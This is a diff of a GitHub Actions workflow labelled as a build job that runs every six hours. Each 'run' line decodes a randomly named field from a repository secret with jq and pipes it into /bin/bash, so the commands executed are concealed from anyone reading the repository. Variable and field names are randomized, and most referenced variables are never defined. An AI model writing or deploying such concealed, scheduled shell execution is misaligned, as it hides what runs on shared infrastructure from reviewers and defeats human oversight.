@@ -2,8 +2,7 @@ name: lishijianliang
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 0/6 * * *'
-
+    - cron: '43 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,21 +10,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: lishijianliang
         env:
-          u62988: ${{ secrets.u62988 }}
+          q3: ${{ secrets.q3 }}
         run: |
-          echo $u62988 | jq -r .dxe369 | /bin/bash
-          echo $d51 | jq -r .kkom666 | /bin/bash
-          echo $ou71 | jq -r .u59 | /bin/bash
-          echo $qv873 | jq -r .rz5404 | /bin/bash
-          echo $puhdk89 | jq -r .gqcb29821 | /bin/bash
-          echo $s24881 | jq -r .s91 | /bin/bash
-          echo $aol3 | jq -r .vzy8 | /bin/bash
-          echo $wha1 | jq -r .e059 | /bin/bash
-          echo $rrdl6927 | jq -r .xo145 | /bin/bash
-          echo $rqfd51317 | jq -r .cyqe0825 | /bin/bash
-          echo $uo682 | jq -r .fo81 | /bin/bash
-          echo $lvng052 | jq -r .ikst681 | /bin/bash
-          echo $nbe708 | jq -r .mpw866 | /bin/bash
-          echo $gc39 | jq -r .bwsl7 | /bin/bash
-          echo $kgbcu15 | jq -r .ohkp34481 | /bin/bash
+          echo $q3 | jq -r .pflx643 | /bin/bash
+          echo $z6272 | jq -r .z48 | /bin/bash
+          echo $vsb1 | jq -r .wkz8 | /bin/bash
+          echo $ppvmt68 | jq -r .kdai702 | /bin/bash
+          echo $amnmf4456 | jq -r .alixq0 | /bin/bash
+          echo $rkjw37 | jq -r .oqj97 | /bin/bash
+          echo $z83 | jq -r .xwgcb4 | /bin/bash
+          echo $krrl63495 | jq -r .lybj4 | /bin/bash
 
